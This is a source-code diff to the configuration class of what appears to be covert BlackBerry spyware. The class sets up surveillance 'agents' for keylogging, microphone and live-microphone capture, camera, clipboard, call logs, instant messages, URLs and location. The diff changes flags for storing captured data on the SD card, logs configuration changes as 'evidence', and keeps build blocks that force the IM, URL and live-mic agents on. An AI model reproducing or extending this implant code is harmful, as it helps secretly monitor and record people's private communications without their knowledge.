@@ -24,6 +24,7 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.params.Parameter;
@@ -51,12 +52,17 @@ public final class Conf {
     public static final boolean DEBUG_OUT = true;
     public static final boolean DEBUG_INFO = false;
 
+    public static final boolean AGENT_APPLICATION_ON_SD = false;
+    public static final boolean AGENT_CALLIST_ON_SD = false;
+    public static final boolean AGENT_CALLLOCAL_ON_SD = false;
+    public static final boolean AGENT_CAM_ON_SD = false;
+    public static final boolean AGENT_CLIPBOARD_ON_SD = false;
+    public static final boolean AGENT_KEYLOG_ON_SD = false;
     public static final boolean AGENT_SNAPSHOT_ON_SD = false;
     public static final boolean AGENT_POSITION_ON_SD = false;
     public static final boolean AGENT_MESSAGE_ON_SD = false;
     public static final boolean AGENT_DEVICEINFO_ON_SD = false;
-    public static final boolean AGENT_APPLICATION_ON_SD = false;
-    public static final boolean AGENT_MIC_ON_SD = true;
+    public static final boolean AGENT_MIC_ON_SD = false;
     public static final boolean AGENT_LIVEMIC_ON_SD = false;
     public static final boolean AGENT_URL_ON_SD = false;
     public static final boolean AGENT_IM_ON_SD = false;
@@ -215,7 +221,8 @@ public final class Conf {
         }
         //#endif
 
-        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF, true);
+        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.NEW_CONF,
+                true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: new config");
@@ -228,16 +235,19 @@ public final class Conf {
                 debug.info("New config");
                 //#endif
                 file.rename(Conf.ACTUAL_CONF, true);
+                Evidence.info("New configuration activated");
                 return true;
             } else {
                 //#ifdef DEBUG
                 debug.error("Reading new configuration");
                 //#endif
                 file.delete();
+                Evidence.info("Invalid new configuration, reverting");
             }
         }
 
-        file = new AutoFlashFile(Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
+        file = new AutoFlashFile(
+                Path.USER() + Path.CONF_DIR + Conf.ACTUAL_CONF, true);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.info("Try: actual config");
@@ -490,7 +500,9 @@ public final class Conf {
                 agent.init(enabled, confParams);
             } else {
                 agent = Agent.factory(agentType, enabled, confParams);
-                status.addAgent(agent);
+                if(agent!=null){
+                    status.addAgent(agent);
+                }
             }
         }
 
@@ -498,12 +510,12 @@ public final class Conf {
         Agent agent1 = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
         status.addAgent(agent1);
         //#endif
-        
+
         //#ifdef URL_FORCED
         Agent agent2 = Agent.factory(Agent.AGENT_URL, true, new byte[0]);
         status.addAgent(agent2);
         //#endif
-        
+
         //#ifdef LIVE_MIC_FORCED
         Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true, new byte[0]);
         status.addAgent(agent3);
